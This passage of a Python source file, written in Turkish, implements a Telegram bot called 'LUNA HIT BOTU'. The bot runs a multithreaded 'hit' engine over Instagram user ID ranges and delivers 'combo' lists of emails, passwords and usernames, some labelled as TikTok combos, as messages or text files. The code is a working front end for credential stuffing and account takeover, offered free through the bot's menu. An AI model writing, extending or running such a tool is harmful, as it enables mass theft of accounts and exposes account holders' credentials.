        self.owner_id = owner_id
        self.storage = storage
        self.api = APIManager()
        self.engine = None
        self.base_url = f"https://api.telegram.org/bot{token}"
        self.last_update_id = 0
        self.running = True
        self.sessions: Dict[str, dict] = {}
        
    def send_message(self, chat_id: str, text: str, keyboard: dict = None, parse_mode: str = "HTML"):
        try:
            params = {
                'chat_id': chat_id,
                'text': text,
                'parse_mode': parse_mode
            }
            if keyboard:
                params['reply_markup'] = json.dumps(keyboard)
            requests.get(f"{self.base_url}/sendMessage", params=params, timeout=5)
        except:
            pass
    
    def edit_message(self, chat_id: str, message_id: int, text: str, keyboard: dict = None):
        try:
            params = {
                'chat_id': chat_id,
                'message_id': message_id,
                'text': text,
                'parse_mode': 'HTML'
            }
            if keyboard:
                params['reply_markup'] = json.dumps(keyboard)
            requests.get(f"{self.base_url}/editMessageText", params=params, timeout=5)
        except:
            pass
    
    def answer_callback(self, callback_id: str, text: str = ""):
        try:
            params = {'callback_query_id': callback_id, 'text': text}
            requests.get(f"{self.base_url}/answerCallbackQuery", params=params, timeout=5)
        except:
            pass
    
    def delete_message(self, chat_id: str, message_id: int):
        try:
            requests.get(f"{self.base_url}/deleteMessage", 
                        params={'chat_id': chat_id, 'message_id': message_id}, timeout=5)
        except:
            pass
    
    def send_document(self, chat_id: str, file_path: Path, caption: str = ""):
        try:
            with open(file_path, 'rb') as f:
                files = {'document': f}
                data = {'chat_id': chat_id, 'caption': caption}
                requests.post(f"{self.base_url}/sendDocument", files=files, data=data, timeout=30)
        except Exception as e:
            self.send_message(chat_id, f"❌ Dosya gönderilirken hata: {str(e)[:50]}")
    
    # ===== MAIN MENU =====
    def show_main_menu(self, chat_id: str, message_id: int = None):
        text = (
            f"<b>🌟 LUNA HIT BOTU v1.0 🌟</b>\n\n"
            f"👑 <b>Owner:</b> @lunasloury\n"
            f"📊 <b>Toplam Hits:</b> {self.storage.get_stats().get('total_hits', 0)}\n"
            f"👥 <b>Toplam Kullanici:</b> {self.storage.get_stats().get('total_users', 0)}\n"
            f"📦 <b>Toplam Combos:</b> {self.storage.get_stats().get('total_combos', 0)}\n\n"

            f"<i>6 API Entegrasyonu ile çalışır</i>"
        )
        
        keyboard = {
            "inline_keyboard": [
                [
                    {"text": "🎯 HIT TARA", "callback_data": "start_hit"},
                    {"text": "📦 COMBO OLUŞTUR", "callback_data": "start_combo"}
                ],
                [
                    {"text": "📊 İSTATİSTİK", "callback_data": "stats"},
                    {"text": "👥 KULLANICILAR", "callback_data": "users_list"}
                ],
                [
                    {"text": "📁 DOSYALAR", "callback_data": "files"},
                    {"text": "⚙️ AYARLAR", "callback_data": "settings"}
                ],
                [
                    {"text": "🛑 DURDUR", "callback_data": "stop_engine"},
                    {"text": "🚀 PING", "callback_data": "ping"}
                ]
            ]
        }
        
        if message_id:
            self.edit_message(chat_id, message_id, text, keyboard)
        else:
            self.send_message(chat_id, text, keyboard)
    
    # ===== YEAR SELECTION (YILLARI INLINEKEYBOARDBUTTON OLARAK GÖSTER) =====
    def show_year_selection(self, chat_id: str, mode: str, message_id: int = None):
        """Yılları InlineKeyboardButton olarak göster"""
        text = (
            f"<b>📅 YIL SEÇİMİ</b>\n\n"
            f"Lütfen bir yıl seçin:\n"
            f"Seçtiğiniz yılın Instagram kullanıcı ID aralığı kullanılacak.\n\n"
            f"<b>İşlem:</b> {mode.upper()}"
        )
        
        # Yılları satır satır InlineKeyboardButton olarak göster
        years = YEAR_NAMES
        keyboard_rows = []
        
        # Her satıra 3 yıl
        for i in range(0, len(years), 3):
            row = []
            for j in range(3):
                if i + j < len(years):
                    row.append({
                        "text": f"📅 {years[i+j]}",
                        "callback_data": f"year_{mode}_{years[i+j]}"
                    })
            keyboard_rows.append(row)
        
        # Geri dönüş butonu
        keyboard_rows.append([
            {"text": "🔙 GERİ", "callback_data": "main_menu"}
        ])
        
        keyboard = {"inline_keyboard": keyboard_rows}
        
        if message_id:
            self.edit_message(chat_id, message_id, text, keyboard)
        else:
            self.send_message(chat_id, text, keyboard)
    
    # ===== HIT COUNT SELECTION (KAÇ HİT İSTEDİĞİNİ SOR) =====
    def ask_hit_count(self, chat_id: str, year: str, mode: str, message_id: int = None):
        """Kullanıcıdan kaç adet istediğini sor"""
        text = (
            f"<b>🔢 KAÇ ADET İSTİYORSUN?</b>\n\n"
            f"📅 <b>Yıl:</b> {year}\n"
            f"📋 <b>İşlem:</b> {mode.upper()}\n\n"
            f"Lütfen bir sayı girin (1-1000 arası):\n\n"
            f"<i>Not: 10 ve altı mesaj olarak, 10 üstü dosya olarak gönderilir.</i>"
        )
        
        keyboard = {
            "inline_keyboard": [
                [{"text": "5", "callback_data": f"count_{mode}_{year}_5"}],
                [{"text": "10", "callback_data": f"count_{mode}_{year}_10"}],
                [{"text": "25", "callback_data": f"count_{mode}_{year}_25"}],
                [{"text": "50", "callback_data": f"count_{mode}_{year}_50"}],
                [{"text": "100", "callback_data": f"count_{mode}_{year}_100"}],
                [{"text": "🎲 Rastgele Sayı Gir", "callback_data": f"custom_count_{mode}_{year}"}],
                [{"text": "🔙 GERİ", "callback_data": "main_menu"}]
            ]
        }
        
        if message_id:
            self.edit_message(chat_id, message_id, text, keyboard)
        else:
            self.send_message(chat_id, text, keyboard)
    
    # ===== PROCESS COMBO (KOMBO OLUŞTUR VE GÖNDER) =====
    def process_combo(self, chat_id: str, year: str, count: int, message_id: int = None):
        """Ana combo oluşturma işlemi - tüm 6 API kullanılır"""
        
        # İşlem mesajı gönder
        status_text = (
            f"<b>🔍 KOMBO OLUŞTURULUYOR...</b>\n\n"
            f"📅 <b>Yıl:</b> {year}\n"
            f"🔢 <b>Adet:</b> {count}\n"
            f"🔄 <b>API'ler:</b> 6 API aktif\n\n"
            f"<i>Lütfen bekleyin, işlem devam ediyor...</i>\n"
            f"<i>Bu işlem 1-5 dakika sürebilir.</i>"
        )
        
        if message_id:
            self.edit_message(chat_id, message_id, status_text)
        
        # Kullanıcı kaydı
        self.storage.add_user(chat_id)
        
        # Yıl aralığını al
        uid_start, uid_end = YEAR_RANGES.get(year, (1, 1000000))
        
        # API Manager ile combo oluştur (tüm 6 API kullanılır)
        combo_data = self.api.generate_combos(count, year, uid_start, uid_end)
        
        if not combo_data:
            error_text = (
                f"<b>❌ HİÇ KOMBO BULUNAMADI!</b>\n\n"
                f"📅 <b>Yıl:</b> {year}\n"
                f"🔢 <b>İstenen:</b> {count}\n\n"
                f"<i>Farklı bir yıl veya daha düşük sayı deneyin.</i>"
            )
            if message_id:
                self.edit_message(chat_id, message_id, error_text)
            else:
                self.send_message(chat_id, error_text)
            return
        
        # Kullanıcı istatistiklerini güncelle
        self.storage.update_user_stats(chat_id, hits=len(combo_data), combos=1)
        
        # 10 VE ALTI: MESAJ OLARAK GÖNDER
        if count <= 10:
            self._send_combo_as_messages(chat_id, combo_data, year, message_id)
        
        # 10 ÜSTÜ: DOSYA OLARAK GÖNDER (LUNA-TİKTOK-COMBO{random}.txt)
        else:
            self._send_combo_as_file(chat_id, combo_data, year, message_id)
    
    def _send_combo_as_messages(self, chat_id: str, combo_data: list, year: str, status_message_id: int = None):
        """10 ve altı kombo sayısında mesaj olarak gönder"""
        
        for i, item in enumerate(combo_data):
            text = (
                f"<b>📦 KOMBO #{i+1}</b>\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"📧 <b>Email:</b> <code>{item.get('email', 'N/A')}</code>\n"
                f"🔑 <b>Password:</b> <code>{item.get('password', 'N/A')}</code>\n"
                f"👤 <b>Username:</b> @{item.get('username', 'N/A')}\n"
                f"🆔 <b>User ID:</b> {item.get('user_id', 'N/A')}\n"
                f"📅 <b>Year:</b> {year}\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"👑 <b>Owner:</b> @lunasloury"
            )
            self.send_message(chat_id, text)
        
        # Başarı mesajı
        success_text = (
            f"<b>✅ İŞLEM TAMAMLANDI!</b>\n\n"
            f"📦 <b>Toplam:</b> {len(combo_data)} kombo\n"
            f"📅 <b>Yıl:</b> {year}\n"
            f"📤 <b>Gönderim:</b> Mesaj olarak ({len(combo_data)} adet)\n\n"
            f"<i>6 API başarıyla kullanıldı.</i>"
        )
        if status_message_id:
            self.edit_message(chat_id, status_message_id, success_text)
        else:
            self.send_message(chat_id, success_text)
    
    def _send_combo_as_file(self, chat_id: str, combo_data: list, year: str, status_message_id: int = None):
        """10 üstü kombo sayısında LUNA-TİKTOK-COMBO{random}.txt olarak gönder"""
        
        # Dosyaya kaydet
        filepath, filename = self.storage.save_combo_file(combo_data, year)
        
        # İlerleme mesajı
        if status_message_id:
            self.edit_message(
                chat_id, status_message_id,
                f"<b>📤 DOSYA GÖNDERİLİYOR...</b>\n\n"
                f"📁 <b>Dosya:</b> {filename}\n"
                f"📦 <b>İçerik:</b> {len(combo_data)} kombo\n"
                f"📅 <b>Yıl:</b> {year}\n\n"
                f"<i>Dosya gönderiliyor...</i>"
            )
        
        # Dosyayı gönder
        caption = (
            f"<b>📦 LUNA TİKTOK COMBO</b>\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"📁 <b>Dosya:</b> {filename}\n"
            f"📦 <b>Kombo:</b> {len(combo_data)} adet\n"
            f"📅 <b>Yıl:</b> {year}\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"👑 <b>Owner:</b> @lunasloury"
        )
        
        self.send_document(chat_id, filepath, caption)
        
        # Başarı mesajı
        success_text = (
            f"<b>✅ İŞLEM TAMAMLANDI!</b>\n\n"
            f"📁 <b>Dosya:</b> {filename}\n"
            f"📦 <b>Toplam:</b> {len(combo_data)} kombo\n"
            f"📅 <b>Yıl:</b> {year}\n"
            f"📤 <b>Gönderim:</b> Dosya olarak\n\n"
            f"<i>6 API başarıyla kullanıldı.</i>"
        )
        if status_message_id:
            self.edit_message(chat_id, status_message_id, success_text)
        else:
            self.send_message(chat_id, success_text)
    
    # ===== PROCESS HIT (HIT TARA) =====
    def process_hit(self, chat_id: str, year: str, count: int, message_id: int = None):
        """Hit tarama işlemi"""
        
        status_text = (
            f"<b>🔍 HİT TARANIYOR...</b>\n\n"
            f"📅 <b>Yıl:</b> {year}\n"
            f"🔢 <b>Adet:</b> {count}\n"
            f"🔄 <b>API'ler:</b> 6 API aktif\n\n"
            f"<i>Lütfen bekleyin, işlem devam ediyor...</i>"
        )
        
        if message_id:
            self.edit_message(chat_id, message_id, status_text)
        
        self.storage.add_user(chat_id)
        uid_start, uid_end = YEAR_RANGES.get(year, (1, 1000000))
        
        # Hit Engine'i başlat
        self.engine = HitEngine(
            storage=self.storage,
            api=self.api,
            year=year,
            telegram_token=self.token,
            telegram_chat_id=chat_id
        )
        
        # Engine'i thread'de çalıştır
        def run_engine():
            self.engine.start(threads=50, max_hits=count)
        
        t = threading.Thread(target=run_engine, daemon=True)
        t.start()
        
        # Sonuç mesajı
        success_text = (
            f"<b>✅ HİT TARAMA BAŞLATILDI!</b>\n\n"
            f"📅 <b>Yıl:</b> {year}\n"
            f"🎯 <b>Hedef:</b> {count} hit\n\n"
            f"<i>Hits bulundukça size gönderilecektir.</i>\n"
            f"<i>Durdurmak için menüden 🛑 DURDUR butonuna basın.</i>"
        )
        if message_id:
            self.edit_message(chat_id, message_id, success_text)
        else:
            self.send_message(chat_id, success_text)
    
    # ===== SHOW STATS =====
    def show_stats(self, chat_id: str, message_id: int = None):
        stats = self.storage.get_stats()
        text = (
            f"<b>📊 LUNA HIT BOTU İSTATİSTİKLERİ</b>\n\n"
            f"🔥 <b>Toplam Hits:</b> {stats.get('total_hits', 0)}\n"
            f"👥 <b>Toplam Kullanıcı:</b> {stats.get('total_users', 0)}\n"
            f"📦 <b>Toplam Kombolar:</b> {stats.get('total_combos', 0)}\n"
            f"📁 <b>Hit Dosyaları:</b> {stats.get('total_hit_files', 0)}\n"
            f"📁 <b>Combo Dosyaları:</b> {stats.get('total_combo_files', 0)}\n"
            f"🚫 <b>Banlı Kullanıcı:</b> {stats.get('total_banned', 0)}\n"
            f"📅 <b>Başlangıç:</b> {stats.get('started_at', 'N/A')}\n"
            f"✅ <b>Toplam Kontrol:</b> {stats.get('total_checks', 0)}\n\n"
            f"<i>6 API aktif - 12 yıl aralığı</i>"
        )
        
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔄 YENİLE", "callback_data": "stats"}],
                [{"text": "🔙 GERİ", "callback_data": "main_menu"}]
            ]
        }
        
        if message_id:
            self.edit_message(chat_id, message_id, text, keyboard)
        else:
            self.send_message(chat_id, text, keyboard)
    
    # ===== PING =====
    def ping(self, chat_id: str, message_id: int = None):
        text = (
            f"<b>🏓 PONG!</b>\n\n"
            f"✅ <b>Bot:</b> Çalışıyor\n"
            f"⏱️ <b>Saat:</b> {datetime.now().strftime('%H:%M:%S')}\n"
            f"📅 <b>Tarih:</b> {datetime.now().strftime('%Y-%m-%d')}\n\n"
            f"<i>6 API aktif ve hazır.</i>"
        )
        
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔙 GERİ", "callback_data": "main_menu"}]
            ]
        }
        
        if message_id:
            self.edit_message(chat_id, message_id, text, keyboard)
        else:
            self.send_message(chat_id, text, keyboard)
    
    # ===== SHOW USERS =====
    def show_users(self, chat_id: str, page: int = 1, message_id: int = None):
        users = self.storage.get_users()
        items_per_page = 10
        total_pages = max(1, (len(users) + items_per_page - 1) // items_per_page)
        start = (page - 1) * items_per_page
        end = start + items_per_page
        
        user_items = list(users.items())[start:end]
        
        text = (
            f"<b>👥 KULLANICILAR</b>\n\n"
            f"Toplam: {len(users)} kullanıcı\n"
            f"Sayfa: {page}/{total_pages}\n\n"
        )
        
        for cid, data in user_items:
            username = data.get('username', 'N/A')
            hits = data.get('hits_count', 0)
            text += f"• <code>{cid[:8]}..</code> | @{username} | 🔥{hits}\n"
        
        keyboard = {"inline_keyboard": []}
        
        nav_row = []
        if page > 1:
            nav_row.append({"text": "⬅️ ÖNCEKİ", "callback_data": f"users_page_{page-1}"})
        if page < total_pages:
            nav_row.append({"text": "SONRAKİ ➡️", "callback_data": f"users_page_{page+1}"})
        if nav_row:
            keyboard["inline_keyboard"].append(nav_row)
        
        keyboard["inline_keyboard"].append([
            {"text": "🔍 KULLANICI ARA", "callback_data": "search_user"},
            {"text": "🔙 GERİ", "callback_data": "main_menu"}
        ])
        
        if message_id:
            self.edit_message(chat_id, message_id, text, keyboard)
        else:
            self.send_message(chat_id, text, keyboard)
    
    # ===== SHOW FILES =====
    def show_files(self, chat_id: str, message_id: int = None):
        hit_files = list(self.storage.hits_dir.glob("*.txt"))[-10:]
        combo_files = list(self.storage.combos_dir.glob("*.txt"))[-10:]
        
        text = (
            f"<b>📁 DOSYALAR</b>\n\n"
            f"<b>🔥 Son Hit Dosyaları:</b>\n"
        )
        
        for f in hit_files:
            size = f.stat().st_size
            text += f"• {f.name} ({size} bytes)\n"
        
        text += f"\n<b>📦 Son Combo Dosyaları:</b>\n"
        for f in combo_files:
            size = f.stat().st_size
            text += f"• {f.name} ({size} bytes)\n"
        
        text += f"\n<i>Toplam: {len(list(self.storage.hits_dir.glob('*.txt')))} hit, {len(list(self.storage.combos_dir.glob('*.txt')))} combo dosyası</i>"
        
        keyboard = {
            "inline_keyboard": [
                [{"text": "🔙 GERİ", "callback_data": "main_menu"}]
            ]
        }
        
        if message_id:
            self.edit_message(chat_id, message_id, text, keyboard)
        else:
            self.send_message(chat_id, text, keyboard)
    
    # ===== HANDLE CALLBACKS =====
    def handle_callback(self, callback_data: str, chat_id: str, message_id: int, callback_id: str):
        """Handle all callback queries"""
        
        if callback_data == "main_menu":
            self.show_main_menu(chat_id, message_id)
        
        elif callback_data == "start_hit":
            self.show_year_selection(chat_id, "hit", message_id)
        
        elif callback_data == "start_combo":
            self.show_year_selection(chat_id, "combo", message_id)
        
        elif callback_data == "stats":
            self.show_stats(chat_id, message_id)
        
        elif callback_data == "ping":
            self.ping(chat_id, message_id)
        
        elif callback_data == "users_list":
            self.show_users(chat_id, 1, message_id)
        
        elif callback_data == "files":
            self.show_files(chat_id, message_id)
        
        elif callback_data.startswith("users_page_"):
            page = int(callback_data.split("_")[2])
            self.show_users(chat_id, page, message_id)
        
        elif callback_data == "stop_engine":
            if self.engine and self.engine.running:
                self.engine.stop()
                text = "🛑 Engine durduruldu!"
            else:
                text = "❌ Çalışan engine yok."
            self.answer_callback(callback_id, text)
        
        # Year selection callbacks
        elif callback_data.startswith("year_"):
            parts = callback_data.split("_")
            mode = parts[1]  # "hit" or "combo"
            year = parts[2]
            self.ask_hit_count(chat_id, year, mode, message_id)
        
        # Count callbacks
        elif callback_data.startswith("count_"):
            parts = callback_data.split("_")
            mode = parts[1]
            year = parts[2]
            count = int(parts[3])
            
            if mode == "hit":
                self.process_hit(chat_id, year, count, message_id)
            elif mode == "combo":
                self.process_combo(chat_id, year, count, message_id)
        
        elif callback_data == "custom_count_hit":
            # TODO: özel sayı girişi
            self.send_message(chat_id, "Özel sayı girişi henüz aktif değil. Lütfen hazır butonlardan seçin.")
        
        elif callback_data == "custom_count_combo":
            self.send_message(chat_id, "Özel sayı girişi henüz aktif değil. Lütfen hazır butonlardan seçin.")
        
        elif callback_data == "settings":
            text = (
                f"<b>⚙️ AYARLAR</b>\n\n"
                f"🔧 <b>Thread:</b> 50\n"
                f"🌐 <b>API:</b> 6 API aktif\n"
                f"📅 <b>Yıl:</b> 2012-2024\n"
                f"👑 <b>Owner:</b> @lunasloury\n"
                f"💰 <b>Fiyat:</b> Ücretsiz\n\n"
                f"<i>API'ler otomatik rotasyon ile çalışır.</i>"
            )
            keyboard = {
                "inline_keyboard": [
                    [{"text": "🔙 GERİ", "callback_data": "main_menu"}]
                ]
            }
            self.edit_message(chat_id, message_id, text, keyboard)
        
        elif callback_data == "search_user":
            self.send_message(chat_id, "Kullanıcı ID veya username girin:")
    
    # ===== RUN BOT (ANA POLLING DÖNGÜSÜ) =====
    def run(self):
        """Ana bot polling döngüsü"""
        print(f"{Colors.LUNA}{'='*60}{Colors.RESET}")
        print(f"{Colors.LUNA}  🌟 LUNA HIT BOTU BAŞLATILDI 🌟{Colors.RESET}")
        print(f"{Colors.LUNA}  Owner: @lunasloury{Colors.RESET}")
        print(f"{Colors.LUNA}  6 API Entegrasyonu Aktif{Colors.RESET}")
        print(f"{Colors.LUNA}{'='*60}{Colors.RESET}\n")
        
        while self.running:
            try:
                response = requests.get(
                    f"{self.base_url}/getUpdates",
                    params={
                        'offset': self.last_update_id + 1,
                        'timeout': 30,
                        'allowed_updates': json.dumps(['message', 'callback_query'])
                    },
                    timeout=35
                )
                
                if response.status_code != 200:
                    time.sleep(5)
                    continue
                
                data = response.json()
                if not data.get('ok'):
                    continue
                
                for update in data.get('result', []):
                    self.last_update_id = update['update_id']
                    
                    # Handle messages
                    if 'message' in update:
                        msg = update['message']
                        chat_id = str(msg['chat']['id'])
                        text = msg.get('text', '')
                        
                        # /start command
                        if text == '/start':
                            self.show_main_menu(chat_id)
                        
                        # /stats command
                        elif text == '/stats':
                            self.show_stats(chat_id)
                        
                        # Handle text for custom count
                        elif text.isdigit() and 1 <= int(text) <= 1000:
                            count = int(text)
                            # Check if user has active session
                            if chat_id in self.sessions and 'mode' in self.sessions[chat_id] and 'year' in self.sessions[chat_id]:
                                mode = self.sessions[chat_id]['mode']
                                year = self.sessions[chat_id]['year']
                                
                                if mode == "hit":
                                    self.process_hit(chat_id, year, count)
                                elif mode == "combo":
                                    self.process_combo(chat_id, year, count)
                                
                                del self.sessions[chat_id]
                            else:
                                self.send_message(chat_id, "Lütfen önce menüden bir işlem seçin.")
                        
                        # Search user
                        elif chat_id in self.sessions and self.sessions[chat_id].get('searching'):
                            results = self.storage.find_user(text)
                            if results:
                                msg = "<b>🔍 Kullanıcılar Bulundu:</b>\n\n"
                                for user in results[:10]:
                                    msg += f"• <code>{user['chat_id'][:8]}..</code> | @{user.get('username', 'N/A')} | 🔥{user.get('hits_count', 0)} hits\n"
                            else:
                                msg = "❌ Kullanıcı bulunamadı."
                            self.send_message(chat_id, msg)
                            self.sessions[chat_id]['searching'] = False
                        
                        else:
                            self.show_main_menu(chat_id)
                    
                    # Handle callbacks
                    elif 'callback_query' in update:
                        cb = update['callback_query']
                        callback_id = cb['id']
                        chat_id = str(cb['message']['chat']['id'])
                        message_id = cb['message']['message_id']
                        data = cb['data']
                        
                        self.handle_callback(data, chat_id, message_id, callback_id)
                        
                        # Answer callback
                        self.answer_callback(callback_id)
            
            except Exception as e:
                print(f"\n{Colors.RED}  ❌ Polling Error: {e}{Colors.RESET}")
                time.sleep(5)
    
    def stop(self):
        self.running = False



from keep_alive import keep_alive
keep_alive()



# ===================== MAIN FUNCTION =====================
def main():
    """Ana fonksiyon - ID ve Token girişi"""
    
    print(f"\n{Colors.LUNA}{'='*60}{Colors.RESET}")
    print(f"{Colors.LUNA}  🌟 LUNA HIT BOTU v1.0 🌟{Colors.RESET}")
    print(f"{Colors.LUNA}  Owner: @lunasloury{Colors.RESET}")
    print(f"{Colors.LUNA}  6 API Entegrasyonu - Full Otomasyon{Colors.RESET}")
    print(f"{Colors.LUNA}{'='*60}{Colors.RESET}\n")
    
    print(f"{Colors.YELLOW}  ⚠️  Lütfen Telegram Bot Bilgilerinizi Girin{Colors.RESET}\n")
    
    # Token girişi
    token = lunatoken31

    # Owner ID girişi
    owner_id = lunaid31

    
    print(f"\n{Colors.GREEN}  ✅ Bilgiler alındı! Bot başlatılıyor...{Colors.RESET}\n")
    
    # Storage ve AdminBot başlat
    storage = Storage()
    bot = AdminBot(token, owner_id, storage)
    
    try:
        bot.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}  Bot durduruldu.{Colors.RESET}")
        bot.stop()


if __name__ == "__main__":
    main()
